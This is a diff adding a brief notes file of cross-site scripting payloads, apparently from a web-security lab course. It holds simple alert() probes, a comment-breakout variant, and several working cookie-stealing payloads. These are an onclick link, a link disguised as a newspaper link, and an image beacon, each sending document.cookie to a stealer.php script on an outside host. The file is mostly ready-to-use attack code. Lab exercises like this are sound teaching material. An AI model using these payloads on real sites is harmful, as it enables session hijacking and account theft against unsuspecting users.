@@ -1,0 +1,19 @@
+
+Lab 1:
+<script>alert("ok")</script>
+
+Lab 2:
+-->   <script>alert("ok")<%2Fscript>  <!--
+
+Lab 3:
+
+This will work:
+<a href="#" onclick="document.location='http://users.metropolia.fi/~kimmosa/evilsite/stealer.php?cookie=' +escape(document.cookie);">Click Me</a></script>
+
+This also makes the hover over text to point somewhere else and still steals the cookies:
+<a href="http://www.hs.fi" onmousedown="document.location='http://users.metropolia.fi/~kimmosa/evilsite/stealer3.php?cookie=' +escape(document.cookie);">Helsingin Sanomat</a>
+
+
+</script>
+This will create an image which will steal cookies:
+<script>new Image().src="http://users.metropolia.fi/~kimmosa/evilsite/stealer3.php?cookie="+encodeURI(document.cookie);</script>
